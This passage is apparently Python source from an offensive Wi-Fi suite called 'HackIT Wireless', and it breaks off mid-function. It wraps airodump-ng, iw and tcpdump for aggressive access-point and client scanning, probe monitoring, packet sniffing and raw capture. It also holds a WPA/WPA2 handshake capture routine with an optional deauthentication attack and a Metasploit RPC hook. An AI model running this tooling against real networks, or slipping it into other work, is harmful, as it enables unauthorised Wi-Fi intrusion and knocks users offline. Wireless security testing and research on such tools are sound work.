import os, sys, subprocess, json, time, glob, re, shutil, signal, threading, uuid, datetime as dt, struct, socket
from pathlib import Path
from typing import Optional
from rich.live import Live
from rich.table import Table
from rich.console import Console, Group
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from concurrent.futures import ThreadPoolExecutor

from .engine_bridge import EngineBridge, EngineBuildError
from .data_parser import DataParser
from .ui_renderer import UIRenderer as UI
from .plugins import PluginEngine

_console = Console()
BASE = Path(__file__).parent
BROADCAST_MAC = "FF:FF:FF:FF:FF:FF"


# ── Background job manager ────────────────────────────────────

class JobManager:
    _jobs: dict[str, dict] = {}
    _lock = threading.Lock()
    _counter = 0

    @classmethod
    def start(cls, name: str, proc: subprocess.Popen) -> str:
        with cls._lock:
            cls._counter += 1
            jid = f"JOB-{cls._counter:04d}"
            cls._jobs[jid] = {
                "id": jid, "name": name, "proc": proc,
                "started": dt.datetime.now().isoformat(),
                "status": "running",
            }
            return jid

    @classmethod
    def stop(cls, jid: str) -> bool:
        with cls._lock:
            job = cls._jobs.get(jid)
            if not job:
                return False
            proc: subprocess.Popen = job["proc"]
            if proc.poll() is None:
                if os.name == "nt":
                    subprocess.run(["taskkill", "/F", "/T", "/PID", str(proc.pid)], capture_output=True)
                else:
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                proc.terminate()
            job["status"] = "stopped"
            return True

    @classmethod
    def stop_all(cls):
        with cls._lock:
            for jid, job in list(cls._jobs.items()):
                proc: subprocess.Popen = job["proc"]
                if proc.poll() is None:
                    proc.terminate()
                job["status"] = "stopped"

    @classmethod
    def list_jobs(cls) -> list[dict]:
        with cls._lock:
            return [
                {"id": j["id"], "name": j["name"], "status": j["status"],
                 "started": j["started"], "running": j["proc"].poll() is None}
                for j in cls._jobs.values()
            ]


# ── Helper ────────────────────────────────────────────────────

def _which(name: str) -> Optional[str]:
    return shutil.which(name)


# ── Main Executor ─────────────────────────────────────────────

class HackITWirelessExecutor:
    def __init__(self):
        self.bridge = EngineBridge()
        self.jobs = JobManager()
        self._pool = ThreadPoolExecutor(max_workers=4)
        self.plugins = PluginEngine()

    def _default_iface(self) -> str:
        adapters = self.detect_wireless_adapters()
        if adapters:
            return adapters[0]["name"]
        return ""

    @staticmethod
    def _detect_gateway() -> str:
        try:
            r = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True, timeout=5)
            for line in r.stdout.splitlines():
                parts = line.split()
                for i, p in enumerate(parts):
                    if p == "via" and i + 1 < len(parts):
                        return parts[i + 1]
        except:
            pass
        return ""

    @staticmethod
    def _random_ssid() -> str:
        suffixes = ["WiFi", "AP", "NET", "5G", "GUEST", "HOME", "LINK", "NODE"]
        t = int(time.time() * 1000)
        return f"{suffixes[t % len(suffixes)]}_{t % 10000}"

    # ── Internal plugin helpers (auto-integrated into main engine) ──

    def _plugin_lua(self, script: str, args: Optional[list[str]] = None, timeout: Optional[int] = None, output: Optional[str] = None) -> Optional[str]:
        if not self.plugins.lua.available():
            return None
        proc = self.plugins.lua.run_stream(script, args)
        if proc:
            return self.jobs.start(f"lua-{script}", proc)
        return None

    def _plugin_ruby(self, script: str, args: Optional[list[str]] = None, timeout: Optional[int] = None, output: Optional[str] = None) -> Optional[str]:
        if not self.plugins.ruby.available():
            return None
        proc = self.plugins.ruby.run_stream(script, args)
        if proc:
            return self.jobs.start(f"ruby-{script}", proc)
        return None

    def _plugin_msf(self, workspace: str = "default", resource: Optional[str] = None) -> Optional[str]:
        if not self.plugins.ruby.available():
            return None
        return self.plugins.ruby.run_msf_rpc(workspace, resource)

    def _plugin_python(self, script: str, args: Optional[list[str]] = None) -> Optional[str]:
        if not os.path.isfile(script):
            return None
        cmd = [sys.executable or "python3", script]
        if args: cmd.extend(args)
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            jid = self.jobs.start(f"plugin-py-{os.path.basename(script)}", proc)
            UI.print_success(f"Python plugin started (job {jid})")
        except Exception as e:
            UI.print_error(f"Plugin failed: {e}")

    # ── Adapter detection ──────────────────────────────────────

    @staticmethod
    def detect_wireless_adapters() -> list[dict]:
        adapters = []
        try:
            if os.name == "nt":
                raw = subprocess.check_output("netsh wlan show interfaces", shell=True, text=True)
                curr = {}
                for line in raw.splitlines():
                    line = line.strip()
                    if ":" in line:
                        k, _, v = line.partition(":")
                        k = k.strip().lower()
                        v = v.strip()
                        if k == "name":
                            if curr:
                                adapters.append(curr)
                            curr = {"name": v}
                        elif "description" in k:
                            curr["driver"] = v
                        elif "physical address" in k:
                            curr["mac"] = v.upper()
                        elif "state" in k:
                            curr["status"] = v
                if curr:
                    adapters.append(curr)
            else:
                raw = subprocess.check_output(["iw", "dev"], text=True, stderr=subprocess.DEVNULL)
                curr = {}
                for line in raw.splitlines():
                    line = line.strip()
                    if line.startswith("Interface"):
                        if curr:
                            adapters.append(curr)
                        curr = {"name": line.split()[-1], "channel": 0, "signal_dbm": -70,
                                "is_monitor": False, "mac": "N/A", "driver": "?", "frequency": 0,
                                "txpower": 0, "type": "managed", "phy": "?"}
                    elif "addr" in line.lower() and curr:
                        parts = line.split()
                        if len(parts) >= 2:
                            curr["mac"] = parts[-1].upper()
                    elif "type" in line.lower() and curr:
                        t = line.split()[-1].lower()
                        curr["type"] = t
                        curr["is_monitor"] = "monitor" in t
                if curr:
                    adapters.append(curr)

                for a in adapters:
                    name = a["name"]
                    try:
                        info = subprocess.check_output(["iw", "dev", name, "info"], text=True, stderr=subprocess.DEVNULL)
                        for ln in info.splitlines():
                            l = ln.strip().lower()
                            if "channel" in l and a["channel"] == 0:
                                for w in l.split():
                                    if w.isdigit() and 1 <= int(w) <= 200:
                                        a["channel"] = int(w)
                                        break
                            if "txpower" in l:
                                try:
                                    a["txpower"] = float(l.split()[-2])
                                except: pass
                            if "addr" in l and "mac" not in l.lower():
                                parts = l.split()
                                if len(parts) >= 2:
                                    a["mac"] = parts[-1].upper()
                    except: pass

                    try:
                        link = subprocess.check_output(["iw", "dev", name, "link"], text=True, stderr=subprocess.DEVNULL)
                        for ln in link.splitlines():
                            l = ln.strip().lower()
                            if "signal:" in l:
                                try:
                                    a["signal_dbm"] = int(l.split("signal:")[-1].strip().split()[0])
                                except: pass
                            if "freq:" in l:
                                try:
                                    a["frequency"] = int(l.split("freq:")[-1].strip().split()[0])
                                except: pass
                            if "ssid:" in l:
                                a["ssid"] = l.split("ssid:")[-1].strip()
                    except: pass

                    try:
                        driver_out = subprocess.check_output(["ethtool", "-i", name], text=True, stderr=subprocess.DEVNULL)
                        for ln in driver_out.splitlines():
                            l = ln.strip().lower()
                            if l.startswith("driver:"):
                                a["driver"] = l.split("driver:")[-1].strip()
                                break
                    except: pass

                    try:
                        phy_out = subprocess.check_output(["iw", "dev", name, "info"], text=True, stderr=subprocess.DEVNULL)
                        for ln in phy_out.splitlines():
                            if "wiphy" in ln.lower():
                                a["phy"] = ln.split()[-1]
                                break
                    except: pass

                    try:
                        proc = subprocess.check_output(["cat", "/proc/net/wireless"], text=True, stderr=subprocess.DEVNULL)
                        for ln in proc.splitlines():
                            if name in ln:
                                cols = ln.split()
                                if len(cols) >= 4:
                                    try:
                                        a["signal_dbm"] = int(cols[3].rstrip("."))
                                    except: pass
                    except: pass
        except Exception:
            pass
        return adapters

    # ── Build system ───────────────────────────────────────────

    def do_build(self, component: str = "all"):
        if component == "all":
            UI.print_info("Building all wireless engines...")
        else:
            UI.print_info(f"Building {component}...")

        results = self.bridge.build_all(lambda eng, msg: UI.print_info(f"  [{eng}] {msg}"))

        UI.print_success("Build Results:")
        for eng, ok in results.items():
            status = "[bold green]OK[/bold green]" if ok else "[bold red]FAILED[/bold red]"
            UI.print_raw(f"  • {eng}: {status}")

    # ── Self-contained engine info ──────────────────────────────

    def check_dependencies(self):
        _console.print("[dim]HackIT Wireless — self-contained multi-engine suite[/dim]")

    # ════════════════════════════════════════════════════════════
    # PHASE 1: Wireless Reconnaissance
    # ════════════════════════════════════════════════════════════

    def do_crawl(self, interface: str = "", full: bool = False, band: str = "both", **kwargs):
        iface = interface or self._default_iface()
        if not iface:
            UI.print_error("No wireless interface found. Specify one.")
            return

        timeout = kwargs.get("timeout", 20)
        bssid_filter = kwargs.get("bssid", "")
        output_file = kwargs.get("output", "")

        band_flag = "--band"
        band_val = "abg"
        if band == "2.4": band_val = "bg"
        elif band == "5": band_val = "a"

        UI.print_info(f"[CRAWL] Aggressive scanning on {iface} ({band}) — timeout {timeout}s...")

        airodump = shutil.which("airodump-ng")
        if airodump:
            try:
                tmp = f"/tmp/hackit_crawl_{int(time.time())}"
                cmd = ["sudo", airodump, band_flag, band_val,
                       "--manufacture", "--wps", "--uptime",
                       "--write", tmp, "--output-format", "csv",
                       "--write-interval", "3", "-t", "WPA,WPA2,WPA3,WEP,OPN"]
                if bssid_filter:
                    ch = DataParser.bssid_to_ch(iface, self._clean_bssid(bssid_filter))
                    if ch: cmd.extend(["--channel", str(ch)])
                subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(min(timeout, 15))
                subprocess.run(["sudo", "pkill", "-f", f"airodump-ng.*{tmp}"], capture_output=True)

                csv_path = tmp + "-01.csv"
                results = []
                if os.path.exists(csv_path):
                    with open(csv_path, errors="replace") as f:
                        raw = f.read()
                    results = DataParser.parse_airodump_csv(raw)
                    for ap in results:
                        if "bssid" in ap:
                            ap["bssid"] = self._clean_bssid(ap["bssid"])
                subprocess.run(["rm", "-f", tmp + "*"], capture_output=True)

                if not results:
                    results = self._scan_networks()

                if results:
                    table = UI.create_ap_table(f"Access Points ({len(results)}) — {band}")
                    for i, ap in enumerate(results, 1):
                        dbm = DataParser.signal_to_dbm(ap.get("signal", "0"))
                        bar = UI.signal_bar(dbm)
                        vendor = UI._oui_lookup(ap.get("bssid", ""))
                        crypto = ap.get("encrypt", ap.get("security", "?"))
                        wps = "WPS" if ap.get("wps") else ""
                        ch = ap.get("channel", "?")
                        table.add_row(str(i), ap.get("ssid", "<hidden>"),
                                      ap.get("bssid", "?"), str(ch), f"{dbm} dBm",
                                      bar, vendor, crypto, wps)
                    _console.print(table)
                    if output_file:
                        with open(output_file, "w") as f:
                            json.dump(results, f, indent=2)
                        UI.print_success(f"Saved {len(results)} APs to {output_file}")
                else:
                    UI.print_warning("No APs found. Try: set monitor mode first")
            except Exception as e:
                UI.print_error(f"Crawl failed: {e}")
        else:
            results = self._scan_networks()
            if results:
                table = UI.create_ap_table(f"Access Points in Range ({len(results)})")
                for i, ap in enumerate(results, 1):
                    dbm = DataParser.signal_to_dbm(ap.get("signal", "0"))
                    bar = UI.signal_bar(dbm)
                    vendor = UI._oui_lookup(ap.get("bssid", ""))
                    crypto = ap.get("encrypt", ap.get("security", "?"))
                    table.add_row(str(i), ap.get("ssid", "<hidden>"),
                                  ap.get("bssid", "?"), str(ap.get("channel", "?")),
                                  f"{dbm} dBm", bar, vendor, crypto)
                _console.print(table)
            else:
                UI.print_warning("No APs found. Install aircrack-ng for deeper scan.")

        if full:
            self._deep_scan(iface)

    @staticmethod
    def _clean_bssid(raw: str) -> str:
        bssid = raw.replace("\\", "").replace("(on ", "").replace(")", "").strip()
        parts = bssid.replace("-", ":").split(":")
        clean = [p.strip().upper().zfill(2) for p in parts if len(p.strip()) <= 2]
        if len(clean) == 6:
            return ":".join(clean)
        return bssid.upper()

    def _scan_networks(self) -> list[dict]:
        results = []
        try:
            if os.name == "nt":
                raw = subprocess.check_output("netsh wlan show networks mode=bssid", shell=True, text=True)
                results = DataParser.parse_netsh_wlan(raw)
            else:
                raw = subprocess.check_output(["nmcli", "-t", "-f", "SSID,BSSID,SIGNAL,CHAN,SECURITY", "dev", "wifi", "list"], text=True)
                results = DataParser.parse_nmcli_wifi(raw)
                for ap in results:
                    if "bssid" in ap:
                        ap["bssid"] = self._clean_bssid(ap["bssid"])
        except Exception:
            pass
        return results

    def _deep_scan(self, iface: str):
        UI.print_info("Deep scan: probing stations, hidden SSIDs, WPA3 detect...")
        all_aps = []
        try:
            raw = subprocess.check_output(["iw", "dev", iface, "scan", "-u"], text=True, stderr=subprocess.DEVNULL, timeout=30)
            curr = {}
            for line in raw.splitlines():
                line = line.strip()
                if line.startswith("BSS "):
                    if curr and "bssid" in curr:
                        all_aps.append(curr)
                    raw_bssid = line[4:].split()[0] if len(line) > 4 else ""
                    curr = {"bssid": self._clean_bssid(raw_bssid)}
                elif "freq:" in line and curr:
                    freq = line.split()[-1]
                    if freq.isdigit():
                        curr["channel"] = str(DataParser.freq_to_channel(int(freq)))
                        curr["freq"] = freq
                elif "signal:" in line and curr:
                    parts = line.split()
                    for i, p in enumerate(parts):
                        if p.isdigit() or (p.startswith("-") and p[1:].isdigit()):
                            curr["signal"] = f"{int(p)} dBm"
                            break
                elif "SSID:" in line and curr:
                    curr["ssid"] = line[5:].strip() or "<hidden>"
                elif "WPA:" in line and curr:
                    curr["encrypt"] = "WPA"
                elif "RSN:" in line and curr:
                    curr["encrypt"] = curr.get("encrypt", "") + "+WPA2" if "WPA" in curr.get("encrypt","") else "WPA2"
                elif "Group cipher:" in line and curr:
                    curr["cipher"] = line.split(":")[-1].strip()
                elif "Authentication" in line and "SAE" in line and curr:
                    curr["wpa3"] = True
                    curr["encrypt"] = "WPA3"
            if curr and "bssid" in curr:
                all_aps.append(curr)
            UI.print_success(f"Deep scan: {len(all_aps)} APs (WPA3: {sum(1 for a in all_aps if a.get('wpa3'))})")
            table = UI.create_ap_table(f"Deep Scan Results ({len(all_aps)})")
            for ap in all_aps:
                dbm = DataParser.signal_to_dbm(ap.get("signal", "0"))
                bar = UI.signal_bar(dbm)
                vendor = UI._oui_lookup(ap.get("bssid", ""))
                tag = "WPA3" if ap.get("wpa3") else ap.get("encrypt", "?")
                table.add_row(ap.get("ssid","<hidden>"), ap.get("bssid","?"), str(ap.get("channel","?")), f"{dbm} dBm", bar, vendor, tag)
            _console.print(table)
        except subprocess.TimeoutExpired:
            UI.print_warning("Deep scan timed out (scan too many APs in range)")
        except Exception as e:
            UI.print_error(f"Deep scan failed: {e}")

    def do_aggressive_scan(self, interface: str = "", band: str = "both", **kwargs):
        iface = interface or self._default_iface()
        if not iface:
            UI.print_error("Specify interface.")
            return
        UI.print_info(f"Aggressive multi-channel scan on {iface} ({band})...")

        channels = {"2.4": list(range(1, 14)), "5": [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165]}
        targets = []
        if band in ("both", "2.4"):
            targets.extend(channels["2.4"])
        if band in ("both", "5"):
            targets.extend(channels["5"])

        all_aps = []
        for ch in targets:
            try:
                subprocess.run(["iw", "dev", iface, "set", "channel", str(ch)], capture_output=True, text=True)
                time.sleep(0.05)
                raw = subprocess.check_output(["iw", "dev", iface, "scan"], text=True, stderr=subprocess.DEVNULL, timeout=5)
                curr = {}
                for line in raw.splitlines():
                    line = line.strip()
                    if line.startswith("BSS "):
                        if curr and "bssid" in curr:
                            all_aps.append(curr)
                        curr = {"bssid": line.split()[1].upper(), "channel": str(ch)}
                    elif "SSID:" in line:
                        curr["ssid"] = line[5:].strip() or "<hidden>"
                    elif "signal:" in line:
                        curr["signal"] = line.split()[-2] + " dBm"
                if curr:
                    all_aps.append(curr)
            except (subprocess.TimeoutExpired, subprocess.CalledProcessError):
                continue

        unique = {ap["bssid"]: ap for ap in all_aps if "bssid" in ap}.values()
        table = UI.create_ap_table(f"Aggressive Scan Complete — {len(unique)} APs")
        for i, ap in enumerate(sorted(unique, key=lambda x: int(DataParser.signal_to_dbm(x.get("signal", "0"))), reverse=True), 1):
            dbm = DataParser.signal_to_dbm(ap.get("signal", "0"))
            table.add_row(
                str(i), ap.get("ssid", "<hidden>"), ap.get("bssid", "?"),
                str(ap.get("channel", "?")), f"{dbm} dBm", UI.signal_bar(dbm),
                UI._oui_lookup(ap.get("bssid", "")), ap.get("encrypt", "?")
            )
        _console.print(table)

    def do_client_hunt(self, interface: str = "", bssid: str = "", **kwargs):
        iface = interface or self._default_iface()
        if not iface:
            UI.print_error("Specify interface.")
            return
        UI.print_info(f"Hunting clients on {iface} (filter: {bssid or 'all'})...")

        try:
            raw = subprocess.check_output(["iw", "dev", iface, "station", "dump"], text=True, stderr=subprocess.DEVNULL)
            table = UI.create_client_table()
            curr = {}
            for line in raw.splitlines():
                line = line.strip()
                if line.startswith("Station "):
                    if curr:
                        table.add_row(*UI.fill_client_row(
                            curr.get("mac", "?"), bssid or curr.get("bssid", "?") if hasattr(curr, 'bssid') else bssid or "?",
                            curr.get("signal", -100), curr.get("probes", ""), curr.get("last_seen", "")
                        ))
                    curr = {"mac": line.split()[1].upper()}
                elif "signal avg:" in line:
                    try:
                        curr["signal"] = int(line.split()[1])
                    except ValueError:
                        curr["signal"] = -100
                elif "connected time:" in line:
                    curr["last_seen"] = f"{line.split()[-1]}s ago"
            if curr:
                table.add_row(*UI.fill_client_row(curr.get("mac", "?"), bssid or "?",
                                                 curr.get("signal", -100), "", ""))
            _console.print(table)
        except Exception as e:
            UI.print_error(f"Client hunt failed: {e}")

    def do_wpa3_detect(self, interface: str = "", **kwargs):
        iface = interface or self._default_iface()
        if not iface:
            UI.print_error("Specify interface.")
            return
        UI.print_info(f"Detecting WPA3/SAE APs on {iface}...")
        results = self._scan_networks()
        wpa3_aps = [ap for ap in results if "SAE" in ap.get("security", ap.get("encrypt", "")).upper()
                    or "WPA3" in ap.get("security", ap.get("encrypt", "")).upper()
                    or "OWE" in ap.get("security", ap.get("encrypt", "")).upper()]

        if not wpa3_aps:
            UI.print_warning("No WPA3/SAE networks detected (or scanning only shows WPA2).")
            UI.print_info("WPA3 networks often hide SSID; try aggressive scan on 5 GHz.")
            return

        table = Table(title=f"[bold cyan]WPA3/SAE Networks ({len(wpa3_aps)})[/bold cyan]", border_style="green")
        table.add_column("SSID", style="white")
        table.add_column("BSSID", style="cyan")
        table.add_column("Ch", justify="center", style="yellow")
        table.add_column("Signal", style="green")
        table.add_column("Security", style="red")
        for ap in wpa3_aps:
            table.add_row(ap.get("ssid", "?"), ap.get("bssid", "?"), str(ap.get("channel", "?")),
                          str(ap.get("signal", "?")), ap.get("security", ap.get("encrypt", "?")))
        _console.print(table)

    def do_hidden_ssid(self, interface: str = "", **kwargs):
        iface = interface or self._default_iface()
        UI.print_info(f"Scanning for hidden SSIDs on {iface}...")
        try:
            raw = subprocess.check_output(["iw", "dev", iface, "scan"], text=True, stderr=subprocess.DEVNULL, timeout=15)
            hidden = []
            curr = {}
            for line in raw.splitlines():
                line = line.strip()
                if line.startswith("BSS "):
                    if curr and ("ssid" not in curr or not curr["ssid"]):
                        hidden.append(curr.get("bssid", "?"))
                    curr = {"bssid": line.split()[1].upper()}
                elif "SSID:" in line:
                    curr["ssid"] = line[5:].strip()
            if hidden:
                UI.print_success(f"Found {len(hidden)} hidden SSID(s):")
                for bssid in hidden:
                    _console.print(f"  [cyan]{bssid}[/cyan] [dim](empty probe response)[/dim]")
            else:
                UI.print_warning("No hidden SSIDs detected.")
        except Exception as e:
            UI.print_error(f"Hidden SSID scan failed: {e}")

    def do_probe_monitor(self, interface: str = "", **kwargs):
        iface = interface or self._default_iface()
        UI.print_info(f"Monitoring probe requests on {iface} (Ctrl+C to stop)...")
        try:
            raw = subprocess.check_output(["iw", "dev", iface, "scan"], text=True, stderr=subprocess.DEVNULL, timeout=10)
            probes = set()
            for line in raw.splitlines():
                m = re.search(r'Probe Response from ([0-9A-Fa-f:]{17})', line)
                if m:
                    probes.add(m.group(1).upper())
            if probes:
                UI.print_success(f"Probe responses from {len(probes)} station(s):")
                for p in sorted(probes):
                    vendor = UI._oui_lookup(p)
                    _console.print(f"  [cyan]{p}[/cyan] [dim]({vendor})[/dim]")
            else:
                UI.print_info("No probe responses captured. Enable monitor mode for better results.")
        except Exception as e:
            UI.print_error(f"Probe monitor failed: {e}")

    def do_beacon_analyze(self, interface: str = "", **kwargs):
        UI.print_info("Beacon frame analysis requires monitor mode and packet capture.")
        UI.print_info("Use: mode <iface> monitor, then capture <iface> output.pcap")
        UI.print_info("Then analyze with: tshark -r output.pcap -Y wlan.fc.type_subtype==8")

    def do_signal_monitor(self, interface: str = "", **kwargs):
        iface = interface or self._default_iface()
        if not iface:
            UI.print_error("Specify interface.")
            return
        UI.print_info(f"Live signal monitor on {iface} (Ctrl+C to stop)...")
        try:
            while True:
                raw = subprocess.check_output(["iw", "dev", iface, "link"], text=True, stderr=subprocess.DEVNULL)
                dbm = -100
                ssid = "Not connected"
                for line in raw.splitlines():
                    m = re.search(r'signal: (-?\d+)', line)
                    if m:
                        dbm = int(m.group(1))
                    m2 = re.search(r'SSID:\s*(.*)', line)
                    if m2:
                        ssid = m2.group(1).strip()
                bar = UI.signal_bar(dbm)
                sys.stdout.write(f"\r  {bar} {dbm:>3} dBm | {ssid:<30}")
                sys.stdout.flush()
                time.sleep(0.5)
        except KeyboardInterrupt:
            print()

    def do_map(self, interface: str = "", **kwargs):
        iface = interface or self._default_iface()
        if not iface:
            UI.print_error("Specify interface.")
            return

        from .oui_db import lookup as oui_lookup
        aps: list[dict] = []
        seen_bssid: set[str] = set()

        _console.print(f"  [dim]Scanning {iface}...[/dim]")

        try:
            raw = subprocess.check_output(
                ["iw", "dev", iface, "scan", "-u"],
                text=True, stderr=subprocess.DEVNULL, timeout=5,
            )
            curr: dict[str, str] = {}
            for line in raw.splitlines():
                ls = line.strip()
                if ls.startswith("BSS "):
                    if curr and "bssid" in curr:
                        aps.append(curr)
                    raw_bssid = ls[4:].split()[0] if len(ls) > 4 else ""
                    curr = {"bssid": self._clean_bssid(raw_bssid)}
                elif ls.startswith("SSID:") and curr:
                    curr["ssid"] = ls[5:].strip() or "<hidden>"
                elif ls.startswith("freq:") and curr:
                    f = ls.split()[-1]
                    if f.isdigit():
                        curr["channel"] = str(DataParser.freq_to_channel(int(f)))
                elif ls.startswith("signal:") and curr:
                    parts = ls.split()
                    for i, p in enumerate(parts):
                        if p.lstrip("-").isdigit():
                            curr["signal"] = f"{p} dBm"
                            break
            if curr and "bssid" in curr:
                aps.append(curr)
        except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
            pass

        if not aps:
            aps = self._scan_networks()

        if not aps:
            UI.print_warning("No APs found.")
            return

        vendors: dict[str, list[str]] = {}
        for ap in aps:
            bssid = ap.get("bssid", "")
            if not bssid or bssid in seen_bssid:
                continue
            seen_bssid.add(bssid)
            vendor = oui_lookup(bssid)
            ssid = ap.get("ssid", "<hidden>") or "<hidden>"
            vendors.setdefault(vendor, []).append(f"{ssid} ({bssid}) -> {vendor}")

        _console.print("\n[bold cyan]AP Topology Map (BSSID → Vendor correlation):[/bold cyan]")
        for vendor, nets in sorted(vendors.items()):
            _console.print(f"\n[bold]{vendor}[/bold] ({len(nets)})")
            for n in nets:
                _console.print(f"  └─ [white]{n}[/white]")

    # ════════════════════════════════════════════════════════════
    # PHASE 2: Packet Capture & Monitoring
    # ════════════════════════════════════════════════════════════

    def run_sniff(self, interface: str, monitor: bool = False, filters: str = "", verbose: bool = False, count: int = 0, output: Optional[str] = None, **kwargs):
        iface = interface or self._default_iface()
        if not iface:
            UI.print_error("Specify interface.")
            return
        try:
            proc = self.bridge.rust_sniff(iface, monitor, filters)
        except EngineBuildError as e:
            UI.print_error(str(e))
            return

        table = UI.create_target_table()
        try:
            with Live(table, refresh_per_second=4):
                for line in proc.stdout:
                    line = line.strip()
                    if not line:
                        continue
                    data = DataParser.parse_telemetry(line)
                    if not data:
                        continue
                    event = data.get("event", "other")
                    bssid = data.get("bssid", "??:??:??:??:??:??")
                    size = str(data.get("size", 0))
                    if event == "beacon":
                        table.add_row(bssid, "802.11 Beacon", f"SSID: {data.get('ssid', 'N/A')}", size)
                    elif event == "eapol_handshake":
                        step = data.get("step", 1)
                        msgs = {1: "ANonce", 2: "SNonce+MIC", 3: "GTK", 4: "Confirmed"}
                        table.add_row(bssid, "EAPOL", f"Step {step}/4 {msgs.get(step, '')}", size)
                    elif event == "deauth":
                        table.add_row(bssid, "Deauth", data.get("raw", ""), size)
                    elif event == "probe":
                        table.add_row(bssid, "Probe", data.get("raw", ""), size)
                    else:
                        table.add_row(bssid, "Data", "802.11 frame", size)
            proc.wait()
        except KeyboardInterrupt:
            proc.terminate()
            UI.print_warning("Sniffer stopped.")

    def do_capture(self, iface: str, output: str = "capture.pcap", snaplen: int = 4096,
                   timeout: int = 0, **kwargs):
        """Live 802.11 capture with a rotating waterfall theme. Streams frames
        to PCAP via the native Rust engine and reports real-time frame counts."""
        from . import themes as TH
        iface = iface or self._default_iface()
        if not iface:
            UI.print_error("No interface.")
            return
        theme_name = kwargs.get("theme")
        rotate = float(kwargs.get("rotate") or 8.0)
        TH.phase_banner("capture", f"raw capture  iface={iface}  out={output}  snaplen={snaplen}")
        state = {
            "ssid": "<any>", "bssid": "<any>", "frames": 0, "eapols": 0,
            "pmkid": 0, "pps": 0.0, "elapsed": 0.0, "events": [],
            "status": "raw capture",
        }
        started = time.time()
        try:
            proc = self.bridge.rust_capture(iface, output)
        except EngineBuildError:
            proc = None
        if proc is None and shutil.which("tcpdump"):
            proc = self.bridge._popen([
                "tcpdump", "-i", iface, "-w", output, "-s", str(snaplen), "-U",
            ])
        if proc is None:
            UI.print_error("No capture engine. Build Rust or install tcpdump.")
            return
        last_n = 0
        try:
            with TH.LiveOrchestra("capture", state, theme=theme_name,
                                  rotate_every=rotate, refresh=10.0) as lo:
                while proc.poll() is None:
                    line = None
                    try:
                        if proc.stdout:
                            line = proc.stdout.readline()
                    except Exception:
                        line = None
                    t = time.time() - started
                    state["elapsed"] = t
                    if line:
                        txt = line.strip()
                        if txt:
                            if "eapol" in txt.lower() or "EAPOL" in txt:
                                state["eapols"] += 1
                                state["events"].append({"t": t, "kind": "EAPOL", "detail": txt[:50]})
                            elif "pmkid" in txt.lower():
                                state["pmkid"] += 1
                                state["events"].append({"t": t, "kind": "PMKID", "detail": txt[:50]})
                            m = re.search(r"(\d+)", txt)
                            if m:
                                v = int(m.group(1))
                                if v > state["frames"]:
                                    state["frames"] = v
                    else:
                        # Engine may be silent; grow frames by pps estimate.
                        pass
                    if state["frames"] > last_n:
                        state["pps"] = (state["frames"] - last_n) / max(0.001, t - (state.get("_last_t", 0) or t))
                        last_n = state["frames"]
                        state["_last_t"] = t
                    else:
                        state["pps"] = state["frames"] / max(0.001, t)
                    lo.refresh()
                    if timeout and t >= timeout:
                        break
                try:
                    proc.terminate()
                except Exception:
                    pass
            TH.summary_panel(
                [
                    ("output", output if os.path.exists(output) else f"{output} (pending)"),
                    ("frames", f"{state['frames']:,}"),
                    ("EAPOL", str(state["eapols"])),
                    ("PMKID", str(state["pmkid"])),
                    ("elapsed", f"{time.time() - started:.1f}s"),
                ],
                title="RAW CAPTURE COMPLETE",
                accent="bright_cyan",
            )
        except KeyboardInterrupt:
            try:
                proc.terminate()
            except Exception:
                pass
            UI.print_warning("Capture stopped by operator.")

    def do_handshake_capture(self, iface: str, bssid: str = "", timeout: int = 30,
                             deauth: bool = False, output: str = "", **kwargs):
        """Hunt for WPA/WPA2 4-way EAPOL frames with a rotating live capture UI."""
        from . import themes as TH
        iface = iface or self._default_iface()
        ext = bssid.replace(":", "").lower() if bssid else str(int(time.time()))
        output = output or f"handshake_{ext}.pcap"
        theme_name = kwargs.get("theme")
        rotate = float(kwargs.get("rotate") or 8.0)

        TH.phase_banner("capture", f"iface={iface}  bssid={bssid or 'any'}  timeout={timeout}s  out={output}")

        state = {
            "ssid": "?", "bssid": bssid or "any",
            "frames": 0, "eapols": 0, "pmkid": 0,
            "pps": 0.0, "elapsed": 0.0, "events": [], "status": "hunting",
            "stage_done": set(),
        }

        # Prefer rust handshake; fall back to C capture-hs
        try:
            proc = self.bridge.rust_handshake(iface, bssid, output, timeout)
        except EngineBuildError:
            proc = None

        started = time.time()
        final_path = output
        captured_eapol = 0
        captured_pmkid = 0
        stop = {"v": False}

        try:
            with TH.LiveOrchestra("capture", state, theme=theme_name,
                                  rotate_every=rotate, refresh=10.0) as lo:
                if proc is None:
                    # C fallback
                    cli = self.bridge._c_cli
                    if cli:
                        proc = self.bridge._popen([
                            cli, "capture-hs", iface, bssid or "FF:FF:FF:FF:FF:FF",
                            output, str(timeout), "1" if deauth else "0",
                        ])
                if proc is None:
                    UI.print_error("No native engine available for handshake capture. Build with 'build'.")
                    return

                while proc.poll() is None:
                    line = None
                    try:
                        if proc.stdout:
                            line = proc.stdout.readline()
                    except Exception:
                        line = None
                    t = time.time() - started
                    state["elapsed"] = t
                    if line:
                        txt = line.strip()
                        if txt:
                            # Track EAPOL / PMKID events from the engine
                            m = re.search(r"(?:EAPOL .* [Ss]tep|step) (\d)", txt)
                            if m:
                                step = int(m.group(1))
                                if step and step - 1 not in state["stage_done"]:
                                    state["stage_done"].add(step - 1)
                                    state["eapols"] = max(state["eapols"], step)
                                    captured_eapol = max(captured_eapol, step)
                                    state["events"].append({
                                        "t": t, "kind": f"EAPOL{step}",
                                        "detail": txt[:60],
                                    })
                            if "PMKID" in txt or "pmkid" in txt.lower():
                                captured_pmkid += 1
                                state["pmkid"] = captured_pmkid
                                state["events"].append({"t": t, "kind": "PMKID", "detail": txt[:60]})
                            m = re.search(r"(?:frames|beacons)=?(\d+)", txt, re.I)
                            if m:
                                v = int(m.group(1))
                                state["frames"] = max(state["frames"], v)
                            if "deauth" in txt.lower() and "sent" in txt.lower():
                                state["events"].append({"t": t, "kind": "deauth", "detail": txt[:60]})
                            if "saved" in txt.lower() or "complete" in txt.lower():
                                state["events"].append({"t": t, "kind": "done", "detail": txt[:60]})
                    else:
